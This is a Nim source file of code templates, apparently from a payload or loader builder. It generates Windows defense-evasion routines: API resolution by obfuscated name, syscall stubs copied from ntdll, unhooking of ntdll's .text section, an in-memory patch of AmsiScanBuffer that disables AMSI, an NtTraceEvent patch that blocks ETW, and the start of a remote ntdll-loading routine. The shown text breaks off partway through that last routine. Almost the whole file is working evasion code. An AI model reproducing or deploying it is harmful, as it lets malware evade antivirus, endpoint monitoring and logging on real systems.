import strformat

let DInvokeBaseStub * = """

const
  KERNEL32_DLL* = obf("kernel32.dll")
  NTDLL_DLL* = obf("ntdll.dll")

type
  GetCurrentProcess_t* = proc (): DWORD {.stdcall.}
  GetCurrentProcessId_t* = proc (): DWORD {.stdcall.}
  VirtualAllocEx_t* = proc (hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD): LPVOID {.stdcall.}
  OpenProcess_t* = proc (dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, dwProcessId: DWORD): HANDLE {.stdcall.}
  VirtualProtect_t* = proc (lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL {.stdcall.}

const
  GetCurrentProcessId_HASH * = obf("GetCurrentProcessId")
  VirtualAllocEx_HASH * = obf("VirtualAllocEx")
  GetCurrentProcess_HASH * = obf("GetCurrentProcess")
  OpenProcess_HASH * = obf("OpenProcess")
  VirtualProtect_HASH * = obf("VirtualProtect")

var MyGetCurrentProcess*: GetCurrentProcess_t
var MyVirtualAllocEx*: VirtualAllocEx_t
var MyGetCurrentProcessId*: GetCurrentProcessId_t
var MyOpenProcess*: OpenProcess_t
var MyVirtualProtect*: VirtualProtect_t

MyGetCurrentProcess = cast[GetCurrentProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcess_HASH, 0, FALSE)))

MyGetCurrentProcessId = cast[GetCurrentProcessId_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcessId_HASH, 0, FALSE)))

MyVirtualProtect = cast[VirtualProtect_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualProtect_HASH, 0, FALSE))

MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
"""

let DInvokeLoadLibraryAGetProcAddress * = """

type
  LoadLibraryA_t* = proc (lpLibFileName: LPCSTR): HMODULE {.stdcall.}
  GetProcAddress_t* = proc (hModule: HMODULE, lpProcName: LPCSTR): FARPROC {.stdcall.}
  
const
  LoadLibraryA_HASH * = obf("LoadLibraryA")
  GetProcAddress_HASH * = obf("GetProcAddress")
  
var MyLoadLibraryA*: LoadLibraryA_t
var MyGetProcAddress*: GetProcAddress_t

MyLoadLibraryA = cast[LoadLibraryA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), LoadLibraryA_HASH, 0, FALSE)))

MyGetProcAddress = cast[GetProcAddress_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcAddress_HASH, 0, FALSE)))



"""

let GetSyscallStub * = """
type
  PS_ATTR_UNION* {.pure, union.} = object
    Value*: ULONG
    ValuePtr*: PVOID
  PS_ATTRIBUTE* {.pure.} = object
    Attribute*: ULONG 
    Size*: SIZE_T
    u1*: PS_ATTR_UNION
    ReturnLength*: PSIZE_T
  PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
  PS_ATTRIBUTE_LIST* {.pure.} = object
    TotalLength*: SIZE_T
    Attributes*: array[2, PS_ATTRIBUTE]
  PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST
  KNORMAL_ROUTINE* {.pure.} = object
    NormalContext*: PVOID
    SystemArgument1*: PVOID
    SystemArgument2*: PVOID
  PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE

var 
    SYSCALL_STUB_SIZE: int = 23


type
  CreateFileA_t* = proc (lpFileName: LPCSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE): HANDLE {.stdcall.}
  GetFileSize_t* = proc (hFile: HANDLE, lpFileSizeHigh: LPDWORD): DWORD {.stdcall.}
  RtlAllocateHeap_t* = proc (HeapHandle: PVOID, Flags: ULONG, Size: SIZE_T): PVOID {.stdcall.}
  GetProcessHeap_t* = proc (): HANDLE {.stdcall.}
  ReadFile_t* = proc (hFile: HANDLE, lpBuffer: LPVOID, nNumberOfBytesToRead: DWORD, lpNumberOfBytesRead: LPDWORD, lpOverlapped: LPOVERLAPPED): WINBOOL {.stdcall.}
  
const
  CreateFileA_HASH * = obf("CreateFileA")
  GetFileSize_HASH * = obf("GetFileSize")
  RtlAllocateHeap_HASH * = obf("RtlAllocateHeap")
  GetProcessHeap_HASH * = obf("GetProcessHeap")
  ReadFile_HASH * = obf("ReadFile")
when defined(DInvoke):  
    var MyCreateFileA*: CreateFileA_t
    var MyGetFileSize*: GetFileSize_t
    var MyRtlAllocateHeap*: RtlAllocateHeap_t
    var MyGetProcessHeap*: GetProcessHeap_t
    var MyReadFile*: ReadFile_t

when defined(DInvoke):
    MyCreateFileA = cast[CreateFileA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CreateFileA_HASH, 0, FALSE)))
    MyGetFileSize = cast[GetFileSize_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetFileSize_HASH, 0, FALSE)))
    MyRtlAllocateHeap = cast[RtlAllocateHeap_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(NTDLL_DLL, FALSE)), RtlAllocateHeap_HASH, 0, TRUE)))
    MyGetProcessHeap = cast[GetProcessHeap_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcessHeap_HASH, 0, FALSE)))
    MyReadFile = cast[ReadFile_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), ReadFile_HASH, 0, FALSE)))

proc RVAtoRawOffset(RVA: DWORD_PTR, section: PIMAGE_SECTION_HEADER): PVOID =
    return cast[PVOID](RVA - section.VirtualAddress + section.PointerToRawData)

proc GetSyscallStub(functionName: cstring, syscallStub: LPVOID): BOOL =
    var
        file: HANDLE
        fileSize: DWORD
        bytesRead: DWORD
        fileData: PVOID
        ntdllString: LPCSTR = obf("C:\\windows\\system32\\ntdll.dll")
        nullHandle: HANDLE
    when defined(DInvoke):
        file = MyCreateFileA(ntdllString, cast[DWORD](GENERIC_READ), cast[DWORD](FILE_SHARE_READ), cast[LPSECURITY_ATTRIBUTES](NULL), cast[DWORD](OPEN_EXISTING), cast[DWORD](FILE_ATTRIBUTE_NORMAL), nullHandle)
        fileSize = MyGetFileSize(file, nil)
        fileData = MyRtlAllocateHeap(cast[PVOID](MyGetProcessHeap()), 0, cast[SIZE_T](fileSize))
        let success = MyReadFile(file, fileData, fileSize, addr bytesRead, nil)
    else:
        file = CreateFileA(ntdllString, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullHandle)
        fileSize = GetFileSize(file, nil)
        fileData = RtlAllocateHeap(cast[PVOID](GetProcessHeap()), 0, cast[SIZE_T](fileSize))
        let success = ReadFile(file, fileData, fileSize, addr bytesRead, nil)
    var
        dosHeader: PIMAGE_DOS_HEADER = cast[PIMAGE_DOS_HEADER](fileData)
        imageNTHeaders: PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](fileData) + dosHeader.e_lfanew)
        exportDirRVA: DWORD = imageNTHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
        section: PIMAGE_SECTION_HEADER = IMAGE_FIRST_SECTION(imageNTHeaders)
        textSection: PIMAGE_SECTION_HEADER = section
        rdataSection: PIMAGE_SECTION_HEADER = section

    let low: uint16 = 0

    for Section in low ..< imageNTHeaders.FileHeader.NumberOfSections:
        var ntdllSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(imageNTHeaders)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
        if obf(".rdata") in toString(ntdllSectionHeader.Name):
            rdataSection = ntdllSectionHeader
        
    var exportDirectory: PIMAGE_EXPORT_DIRECTORY = cast[PIMAGE_EXPORT_DIRECTORY](RVAtoRawOffset(cast[DWORD_PTR](fileData) + exportDirRVA, rdataSection))

    var addressOfNames: PDWORD = cast[PDWORD](RVAtoRawOffset(cast[DWORD_PTR](fileData) + cast[DWORD_PTR](exportDirectory.AddressOfNames), rdataSection))
    var addressOfFunctions: PDWORD = cast[PDWORD](RVAtoRawOffset(cast[DWORD_PTR](fileData) + cast[DWORD_PTR](exportDirectory.AddressOfFunctions), rdataSection))
    var stubFound: BOOL = 0
    var oldProtection: DWORD = 0
    let low2: int = 0
    for low2 in 0 ..< exportDirectory.NumberOfNames:
        var functionNameVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfNames[low2], rdataSection))
        var functionVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfFunctions[low2 + 1], textSection))
        var functionNameResolved: cstring = cast[cstring](functionNameVA)
        if (functionNameResolved == functionName):
            copyMem(syscallStub, cast[LPVOID](functionVA), SYSCALL_STUB_SIZE)
            stubFound = 1
    return stubFound

"""


# Todo - use theese functions for all modules

let NtProtectVirtualMemoryDelegate * = """
# Unmanaged NTDLL Declaration
type myNtProtectVirtM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}

var NtProtectVirtualMemory: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}

"""


let NtWriteVirtualMemoryDelegate * = """
# Unmanaged NTDLL Declaration
type myNtWriteVirtM = proc (ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}

var NtWriteVirtualMemory: proc (ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}

"""


let NtCloseDelegate * = """
# Unmanaged NTDLL Declaration
type myNtClose = proc(Handle: HANDLE): NTSTATUS {.stdcall.}
var NtClose: proc(Handle: HANDLE): NTSTATUS {.stdcall.}

"""

let NtAllocateVirtualMemoryDelegate * = """
# Unmanaged NTDLL Declaration
type myNtAllocateVirtM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}

var NtAllocateVirtualMemory: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}

"""


let NtProtectSyscallStart * = """
var hProcess: HANDLE
when defined(DInvoke):
    hProcess = MyGetCurrentProcess()
    
    let tProcess2 = MyGetCurrentProcessId()

    var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
    var syscallStub_NtProtect: LPVOID

    MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
    syscallStub_NtProtect = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
else:
    hProcess = GetCurrentProcess()
    let tProcess2 = GetCurrentProcessId()
    var pHandle2: HANDLE = OpenProcess(cast[DWORD](PROCESS_ALL_ACCESS), cast[WINBOOL](FALSE), tProcess2)
    var syscallStub_NtProtect: LPVOID
    syscallStub_NtProtect = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
"""

let DInvokeUnhookStubs * = """

const
  PSAPI_DLL* = obf("psapi.dll")

type
  MODULEINFO* {.pure.} = object
    lpBaseOfDll*: LPVOID
    SizeOfImage*: DWORD
    EntryPoint*: LPVOID
  LPMODULEINFO* = ptr MODULEINFO

type
  GetModuleHandleA_t* = proc(lpModuleName: LPCSTR): HMODULE {.stdcall.}
  GetModuleInformation_t* = proc(hProcess: HANDLE, hModule: HMODULE, lpmodinfo: LPMODULEINFO, cb: DWORD): WINBOOL {.stdcall.}
  CreateFileMappingA_t* = proc(hFile: HANDLE, lpFileMappingAttributes: LPSECURITY_ATTRIBUTES, flProtect: DWORD, dwMaximumSizeHigh: DWORD, dwMaximumSizeLow: DWORD, lpName: LPCWSTR): HANDLE {.stdcall.}
  MapViewOfFile_t* = proc(hFileMappingObject: HANDLE, dwDesiredAccess: DWORD, dwFileOffsetHigh: DWORD, dwFileOffsetLow: DWORD, dwNumberOfBytesToMap: SIZE_T): LPVOID {.stdcall.}
  FreeLibrary_t* = proc(hLibModule: HMODULE): WINBOOL {.stdcall.}

const
  GetModuleHandleA_HASH * = obf("GetModuleHandleA")
  GetModuleInformation_HASH * = obf("GetModuleInformation")
  CreateFileMappingA_HASH * = obf("CreateFileMappingA")
  MapViewOfFile_HASH * = obf("MapViewOfFile")
  FreeLibrary_HASH * = obf("FreeLibrary")

var MyGetModuleHandleA*: GetModuleHandleA_t
var MyGetModuleInformation*: GetModuleInformation_t
var MyCreateFileMappingA*: CreateFileMappingA_t
var MyMapViewOfFile*: MapViewOfFile_t
var MyFreeLibrary*: FreeLibrary_t

MyGetModuleHandleA = cast[GetModuleHandleA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleHandleA_HASH, 0, FALSE)))

MyGetModuleInformation = cast[GetModuleInformation_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(PSAPI_DLL, TRUE)), GetModuleInformation_HASH, 0, FALSE)))

MyCreateFileMappingA = cast[CreateFileMappingA_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CreateFileMappingA_HASH, 0, FALSE))

MyMapViewOfFile = cast[MapViewOfFile_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), MapViewOfFile_HASH, 0, FALSE))

MyFreeLibrary = cast[FreeLibrary_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), FreeLibrary_HASH, 0, FALSE))
"""

let UnhookSyscalls * = """


proc GetUnhookStubs(): void =

 
    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
    
    var syscallStub_NtClose: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
    
    var oldProtection: DWORD = 0
    
    # Define NtProtectVirtualMemory
    when defined(DInvoke):
        NtProtectVirtualMemory = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
        success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    else:
        NtProtectVirtualMemory = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
        success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    
    # define NtWriteVirtualMemory
    when defined(DInvoke):
        NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
        success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    else:
        NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
        success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    # define NtClose
    when defined(DInvoke):
        NtClose = cast[myNtClose](cast[LPVOID](syscallStub_NtClose))
        success = MyVirtualProtect(cast[LPVOID](syscallStub_NtClose), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    else:
        NtClose = cast[myNtClose](cast[LPVOID](syscallStub_NtClose))
        success = VirtualProtect(cast[LPVOID](syscallStub_NtClose), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    
    success = GetSyscallStub(obf("NtProtectVirtualMemory"), cast[LPVOID](syscallStub_NtProtect))
    success = GetSyscallStub(obf("NtWriteVirtualMemory"), cast[LPVOID](syscallStub_NtWrite))
    success = GetSyscallStub(obf("NtClose"), cast[LPVOID](syscallStub_NtClose))

"""

let UnhookStub * = """


when not defined(DInvoke):
    from winim import MODULEINFO,GetModuleInformation

proc ntdllunhook(): bool =
  let low: uint16 = 0
  when defined(DInvoke):
    var processH = MyGetCurrentProcess()
  else:
    var processH = GetCurrentProcess()
  when defined(DInvoke):
      var ntdllModule = MyGetModuleHandleA(obf("ntdll.dll"))
  else:
      var ntdllModule = GetModuleHandleA(obf("ntdll.dll"))
  var 
      mi : MODULEINFO
      ntdllBase : LPVOID
      ntdllFile : FileHandle
      ntdllMapping : HANDLE
      ntdllMappingAddress : LPVOID
      hookedDosHeader : PIMAGE_DOS_HEADER
      hookedNtHeader : PIMAGE_NT_HEADERS
      hookedSectionHeader : PIMAGE_SECTION_HEADER

  when defined(DInvoke):
      discard MyGetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  else:
      discard GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  ntdllBase = mi.lpBaseOfDll
  ntdllFile = getOsFileHandle(open(obf("C:\\windows\\system32\\ntdll.dll"),fmRead))
  when defined(DInvoke):
      ntdllMapping = MyCreateFileMappingA(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
  else:
      ntdllMapping = CreateFileMappingA(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
  if ntdllMapping == 0:
    echo obf("Could not create file mapping object ") &  fmt"({GetLastError()})."
    return false
  when defined(DInvoke):
      ntdllMappingAddress = MyMapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
  else:
      ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
  if ntdllMappingAddress.isNil:
    echo obf("Could not map view of file ") & fmt"({GetLastError()})."
    return false
  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
  var status = 0
  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
      if ".text" in toString(hookedSectionHeader.Name):
          var oldProtection: DWORD = 0
          var oldProtection2: DWORD = 0
          var bytesWritten: SIZE_T
          var ds: LPVOID = ntdllBase + hookedSectionHeader.VirtualAddress
          var pSize: SIZE_T = cast[SIZE_T](hookedSectionHeader.Misc.VirtualSize)
          status = NtProtectVirtualMemory(processH, &ds, &pSize, 0x04, &oldProtection)
          if status != 0:
            echo obf("[!] NtProtectVirtualMemory failed to modify memory permissions:") & fmt"{GetLastError()}."
            return false
          status = NtWriteVirtualMemory(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten);
          if status != 0:
            echo obf("[!] NtWriteVirtualMemory failed to write bytes to target address:") & fmt"{GetLastError()}."
            return false
          status = NtProtectVirtualMemory(processH, &ds, &pSize, oldProtection, &oldProtection2)
          if status != 0:
            echo obf("[!] NtProtectVirtualMemory failed to reset memory back to it's orignal protections:") & fmt"{GetLastError()}."
            return false  
  status = NtClose(processH)
  status = NtClose(ntdllFile)
  status = NtClose(ntdllMapping)
  when defined(DInvoke):
      discard MyFreeLibrary(ntdllModule)
  else:
      discard FreeLibrary(ntdllModule)
  return true


when isMainModule:
  GetUnhookStubs()
  var result = ntdllunhook()
  echo obf("[*] unhook Ntdll: ") & fmt"{bool(result)}"

"""


let AMSIStub * = """
proc PatchAmsi(): bool =
    var
        amsi: HMODULE
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false
    
    when defined amd64:
        #let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
    elif defined i386:
        #let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
    
    when defined(DInvoke):
        amsi = MyLoadLibraryA(obf("amsi.dll"))
    else:
        amsi = LoadLibraryA(obf("amsi.dll"))
    if (amsi == 0):
        echo obf("[X] Failed to load amsi.dll")
        return disabled

    when defined(DInvoke):
        cs = MyGetProcAddress(amsi,obf("AmsiScanBuffer"))
    else:
        cs = GetProcAddress(amsi,obf("AmsiScanBuffer"))
    if isNil(cs):
        echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
        return disabled
    cs = cs + 0x83 # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112

    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)

    var oldProtection: DWORD = 0
    var success: BOOL

    # Define NtProtectVirtualMemory
    var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
    when defined(DInvoke):
        success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    else:
        success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
    when defined(DInvoke):
        success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    else:
        success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    var protectAddress = cs
    success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
    var friendlycodeLength = cast[SIZE_T](patch.len)
    success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,0x04,addr t) 
    if (success != 0):
        echo obf("NtProtectVirtualMemory failed")
        return disabled
    echo obf("[*] Applying Syscall AMSI patch")
    var outLength: SIZE_T
    
    success = NtWriteVirtualMemory(hProcess,cs,unsafeAddr patch,patch.len,addr outLength)
    
    if (success != 0):
        echo obf("NtWriteVirtualMemory failed")
        return disabled
    success =  NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
    if (success != 0):
        echo obf("NtProtectVirtualMemory failed")
        return disabled
    else:
        echo obf("[*] OldProtect set back")
        disabled = true
    
    when defined(DInvoke):
        success = MyVirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
    else:
        success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
    # Fails for some reason
    #success = NtProtectVirtualMemory(hProcess,addr syscallStub_NtProtect,addr friendlycodeLength,PAGE_READWRITE,addr op)
    echo obf("[*] Restored Stub protections: ") & $success

    return disabled

when isMainModule:
    success = PatchAmsi()
    echo obf("[*] AMSI disabled: ") & fmt"{bool(success)}"
"""


let ETWPatchStub * = """

proc Patchntdll(): bool =
    var
        ntdll: HMODULE
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false
        # two of the functions cause problems for --csharp and --syswhispers --jump at the moment
        #PatchAPIs: seq[string] = @[#[obf("EtwNotificationRegister"),]# #[obf("EtwEventRegister"),]# obf("EtwEventWriteFull"), obf("EtwEventWrite")]
        PatchAPIs: seq[string] = @[obf("NtTraceEvent")] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
    when defined amd64:
        let patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
    when defined(DInvoke):
        ntdll = MyLoadLibraryA(obf("ntdll"))
    else:
        ntdll = LoadLibraryA(obf("ntdll"))
    if (ntdll == 0):
        echo obf("[X] Failed to load ntdll.dll")
        return disabled

    for singleAPI in PatchAPIs:
        echo obf("[*] Patching : "),singleAPI

        when defined(DInvoke):
            cs = MyGetProcAddress(ntdll,singleAPI)
        else:
            cs = GetProcAddress(ntdll,singleAPI)
        if isNil(cs):
            echo obf("[X] Failed to get the address of "), singleAPI
            break

        var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)

        var oldProtection: DWORD = 0
        var success: BOOL

        # Define NtProtectVirtualMemory
        var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
        when defined(DInvoke):
            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        else:
            success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)  

        # define NtWriteVirtualMemory
        let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
        when defined(DInvoke):
            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        else:
            success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)

        var protectAddress = cs
        success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
        success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
        var friendlycodeLength = cast[SIZE_T](patch.len)
        # READWRITE fails for NtTraceEvent, RWX is needed (Only some Windows Versions)
        success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
        if (success != 0):
            echo obf("NtProtectVirtualMemory failed")
            break
        echo obf("[*] Applying Syscall ETW patch")
        var outLength: SIZE_T
    
        success = NtWriteVirtualMemory(hProcess,cs,unsafeAddr patch,patch.len,addr outLength)
    
        if (success != 0):
            echo obf("NtWriteVirtualMemory failed")
            break
        success =  NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,t,addr op)
        if (success != 0):
            echo obf("NtProtectVirtualMemory failed")
            break
        else:
            echo obf("[*] OldProtect set back")
            disabled = true
    
        when defined(DInvoke):
            success = MyVirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
        else:
            success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)

    return disabled

when isMainModule:
    success = Patchntdll()
    echo obf("[*] ETW blocked by patch: ") & fmt"{bool(success)}"
"""

let RemoteLoadNTDLLStub* = """

proc remoteLoadNtdll(processID: var DWORD): bool =

   
    # C:\windows\system32\ntdll.dll
    var friendlycode: array[29, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
    char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
    char(0x33), char(0x32), char(0x5C), char(0x6E), char(0x74), char(0x64), char(0x6C),
    char(0x6C), char(0x2E), char(0x64), char(0x6C), char(0x6C)]
    
    echo obf("[*] Loading ntdll.dll in the remote process: "), processID
    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = processID

    when defined(DInvoke):
        let tProcess2 = MyGetCurrentProcessId()
        MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
        var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)

